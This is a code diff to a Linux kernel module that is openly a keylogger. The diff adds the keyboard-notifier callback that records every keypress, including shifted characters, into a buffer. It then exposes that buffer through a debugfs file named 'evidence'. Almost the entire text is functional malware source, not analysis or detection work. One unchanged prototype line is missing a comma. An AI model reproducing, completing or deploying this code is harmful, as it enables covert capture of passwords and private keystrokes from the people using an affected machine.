@@ -24,8 +24,8 @@ static ssize_t read(struct file *filp,
 		    loff_t *offset);
 
 static int cb(struct notifier_block *nb
-		unsigned long action,
-		void *data);
+	      unsigned long action,
+	      void *data);
 
 static const char *keymap[][2] = {
     {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},                   // 0-3
@@ -73,19 +73,50 @@ static ssize_t read(struct file *filp,
 		    size_t len,
 		    loff_t *offset)
 {
-    return simple_read_from_buffer(buffer, len, offset);
+    return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
 }
+
 
 static struct notifier_block nb = {
     .notifier_call = cb,
 };
+
+int cb(struct notifier_block *nb,
+       unsigned long action,
+       void *data)
+{
+    size_t len;
+    char keybuf[BUF_LEN] = {0};
+    struct keyboard_notifier_param *param = data;
+
+    if (!(param->down))
+        return NOTIFY_OK;
+
+    if (param->value > KEY_RESERVED && param->value <= KEY_PAUSE) {
+        const char *key = (param->shift == 1)
+        ? keymap[param->value][1]
+        : keymap[param->value][0];
+        snprintf(keybuf, BUF_LEN, "%s", key);
+    }
+
+    len = strlen(keybuf);
+
+    if ((buf_pos + len) >= BUF_LEN)
+            buf_pos = 0;
+
+    strncpy(keys_buf + buf_pos, keybuf, len);
+    buf_pos += len;
+
+    return NOTIFY_OK;
+}
+
 
 static int keylogger_init(void)
 {
     file = debugfs_create_file("evidence", 0400, NULL, NULL, &fops);
     if (!file)
         return -ENOENT;
-        
+
     register_keyboard_notifier(&nb);
     return 0;
 }
@@ -94,6 +125,7 @@ static void keylogger_exit(void) {
     unregister_keyboard_notifier(&nb);
     debugfs_remove(file);
 }
+
 
 module_init(keylogger_init);
 module_exit(keylogger_exit);
